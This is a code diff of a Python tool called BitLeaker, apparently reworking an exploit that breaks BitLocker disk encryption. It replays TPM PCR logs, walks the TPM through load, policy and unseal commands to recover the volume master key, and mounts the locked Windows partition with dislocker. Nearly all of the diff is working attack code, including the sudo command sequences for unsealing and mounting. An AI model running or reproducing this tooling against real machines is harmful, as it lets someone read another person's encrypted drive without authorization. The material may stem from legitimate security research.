 # Extract private/public data and PCR policy 
 #
 def extract_priv_pub_and_pcr_policy_from_raw_blob(raw_tpm_blob):
-    print("RAW TPM BLOB: ",end='')
-    print(raw_tpm_blob)
+    #print("RAW TPM BLOB: ",end='')
+    #print(raw_tpm_blob)
     hex_data = []
     for line in raw_tpm_blob:
         line = line.replace('-', ' ')
@@ -389,133 +609,9 @@ def extract_priv_pub_and_pcr_policy_from_raw_blob(raw_tpm_blob):
 
     print("hex_data:",end="")
     print(hex_data)
-    priv_pub = [int(hex_data[i], 16) for i in range(0, 0xc4)]
-    pcr_policy = [int(hex_data[i], 16) for i in range(0xc4, len(hex_data) - 1)]
+    priv_pub = [int(hex_data[i], 16) for i in range(0, len(hex_data)-(22+4))]
+    pcr_policy = [int(hex_data[i], 16) for i in range(len(hex_data)-(22+5), len(hex_data) - 1)]
     return(priv_pub, pcr_policy)
-
-#
-# Prepare TPM data for unsealing VMK of BitLocker
-#
-def prepare_tpm_data(drive_path):
-    info_print('Preparing TPM data.\n')
-    info_print('    [>>] Get TPM-encoded blob from dislocker... ')
-    raw_data_list = get_raw_tpm_encoded_blob_from_dislocker(drive_path)
-    if raw_data_list == []:
-        print('BitLeaker: Error. %s is not BitLocker-locked partition\n' % drive_path)
-        sys.exit(-1)
-    color_print('Success\n', SUCCESS)
-
-    info_print('    [>>] Convert TPM-encoded blob to hex data... ')
-    hex_priv_pub, pcr_policy = extract_priv_pub_and_pcr_policy_from_raw_blob(raw_data_list)
-    color_print('Success\n', SUCCESS)
-    info_print('    [>>] raw_data_list:\n%s,%d\n' % (raw_data_list, len(raw_data_list)))
-    info_print('    [>>] hex_priv:\n%s,%d\n' % (hex_priv_pub, len(hex_priv_pub)))
-    info_print('    [>>] pcr_policy:\n%s,%d\n' % (pcr_policy, len(pcr_policy)))
-
-    # Prepare TPM1_Load data
-    info_print('    [>>] Create TPM1_Load data... ')
-    data = data_tpm1_load_header + hex_priv_pub
-    file = open('tpm1_load.bin', 'wb')
-    file.write(bytearray(data))
-    file.close()
-    color_print('Success\n', SUCCESS)
-
-    # Prepare TPM1_StartSession data
-    info_print('    [>>] Create TPM1_StartSession data... ')
-    data = data_tpm1_startsession
-    file = open('tpm1_startsession.bin', 'wb')
-    file.write(bytearray(data))
-    file.close()
-    color_print('Success\n', SUCCESS)
-
-    # Prepare TPM1_PolicyAuthorize data
-    info_print('    [>>] Create TPM1_PolicyAuthorize data... ')
-    data = data_tpm1_policyauthorize
-    file = open('tpm1_policyauthorize.bin', 'wb')
-    file.write(bytearray(data))
-    file.close()
-    color_print('Success\n', SUCCESS)
-
-    # Prepare TPM1_PCRPolicy data
-    info_print('    [>>] Create TPM1_PolicyPCR data... ')
-    data1 = data_tpm1_pcrpolicy_header + pcr_policy[:len(pcr_policy) - 4]
-    data2 = data_tpm1_pcrpolicy_subheader + pcr_policy[len(pcr_policy) - 4:]
-    file = open('tpm1_policypcr.bin', 'wb')
-    file.write(bytearray(data1))
-    file.write(bytearray(data2))
-    file.close()
-    color_print('Success\n', SUCCESS)
-
-    # Prepare TPM1_Unseal data
-    info_print('    [>>] Create TPM1_Unseal data... ')
-    data = data_tpm1_unseal
-    file = open('tpm1_unseal.bin', 'wb')
-    file.write(bytearray(data))
-    file.close()
-    color_print('Success\n\n', SUCCESS)
-
-#
-# Execute TPM1 command data for unsealing VMK 
-#
-def execute_tpm_cmd_and_extract_vmk():
-    info_print('Execute TPM commands\n')
-    
-    # Execute TPM1_Load command 
-    info_print('    [>>] Execute TPM1_Load... ')
-#    check_and_run_resource_manager()
-    #output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_load.bin' % tpm_library_path)
-    output = subprocess.getoutput('sudo %s ./tpm2-tools/src/tpm2_loadexternal -H n -u pubkey.bin -r privkey.bin' % tpm_library_path)
-    print(output)
-    if 'Fail' in output:
-        color_print('    [>>] Fail\n\n', FAIL)
-        sys.exit(-1)
-    color_print('    [>>] Success\n\n', SUCCESS)
-    sleep(2)
-
-    # Execute TPM1_StartSession command 
-    info_print('    [>>] Execute TPM1_StartSession... ')
-    output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_startsession.bin' % tpm_library_path)
-    print(output)
-    if 'Fail' in output:
-        color_print('    [>>] Fail\n\n', FAIL)
-        sys.exit(-1)
-    color_print('    [>>] Success\n\n', SUCCESS)
-    sleep(2)
-
-    # Execute TPM1_PolicyAuthorize command 
-    info_print('    [>>] Execute TPM1_PolicyAuthorize... ')
-    output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_policyauthorize.bin' % tpm_library_path)
-    print(output)
-    if 'Fail' in output:
-        color_print('    [>>] Fail\n\n', FAIL)
-        sys.exit(-1)
-    color_print('    [>>] Success\n\n', SUCCESS)
-    sleep(2)
-
-    # Execute TPM1_PolicyPCR command 
-    info_print('    [>>] Execute TPM1_PolicyPCR... ')
-    output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_policypcr.bin' % tpm_library_path)
-    print(output)
-    if 'Fail' in output:
-        color_print('    [>>] Fail\n\n', FAIL)
-        sys.exit(-1)
-    color_print('    [>>] Success\n\n', SUCCESS)
-    sleep(2)
-
-    # Execute TPM1_Unseal command 
-    info_print('    [>>] Execute TPM1_Unseal... ')
-    output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_unseal.bin' % tpm_library_path)
-    print(output)
-    if 'Fail' in output:
-        color_print('    [>>] Fail\n\n', FAIL)
-        sys.exit(-1)
-        sys.exit(-1)
-    color_print('    [>>] Success\n\n', SUCCESS)
-    sleep(2)
-
-    # Extract VMK from TPM result
-    vmk_data = extract_vmk_from_tpm_result(output.split('\n'))
-    return vmk_data
 
 #
 # Extract VMK from TPM result
@@ -582,47 +678,34 @@ def mount_bitlocker_partition_with_vmk(drive_path, vmk_data):
     subprocess.getoutput('mkdir windows')
     info_print('    [>>] Mount BitLocker-Locked partition(%s)...\n\n' % drive_path)
     output = subprocess.getoutput('sudo dislocker -v -v -v -V %s -K vmk.bin -- ./windows' % drive_path)
-    print(output)
+    #print(output)
     output = subprocess.getoutput('sudo mount -o loop ./windows/dislocker-file ./windows')
 
 #   
 # Main
 #
 if __name__ == '__main__':
-    # Show a banner
-    show_banner()
+    exploit = BitLeaker()
+    exploit.find_bitlocker_parition()
+    #
+    # NOTE: passing a filename to leak allows "canned" 
+    #       data use.
+    #
+    exploit.leak()
+    exploit.start_tpm()
+    exploit.process_pcr_logs()
 
-    # Searching for BitLocker-locked partitions
-    info_print('Search for BitLocker-locked partitions.\n')
-
-    if len(sys.argv) != 2:
-        output = subprocess.getoutput('sudo fdisk -l 2>/dev/null | grep "Microsoft basic data"').split('\n')
-        if len(output) == 0:
-            color_print('    [>>] BitLocker-locked partition is not found.\n', FAIL)
-            info_print('    [>>] Please try with the explicit drive path. ./bitleaker.py <drive path>\n')
-            sys.exit(-1)
-
-        drive_path = output[0].split(' ')[0]
-    else:
-        drive_path = sys.argv[1]
-
-    info_print('    [>>] BitLocker-locked partition is [%s]\n\n' % drive_path)
-
-    # Prepare PCR data
-    #raw_data = read_canned_pcr_data("bitleaker-data.txt")
-    raw_data = prepare_pcr_data()
-    pcr_list = cut_and_extract_essential_pcr_data(raw_data)
-    replay_pcr_data(pcr_list)
-
+    tpm     = TPMInterface(exploit.logs(),type=exploit.type())
+    print(tpm.Type())
+    tpm.replay_logs()
     # Prepare TPM data and extract VMK
     ##f = open(filename,'wb')
-    ##prepare_tpm_data(drive_path)
-    ##vmk_data = execute_tpm_cmd_and_extract_vmk()
+    tpm.prepare_tpm_data(exploit.bitlocker_path())
+    vmk_data = tpm.execute_tpm_cmd_and_extract_vmk()
+
     ##f.write(hexlify(bytearray(vmk_data)))
     ##f.close()
-    os.system('sudo killall resourcemgr')
     
-   
 #    # Mount BitLocker-locked partition with VMK
 #    mount_bitlocker_partition_with_vmk(drive_path, vmk_data)
 
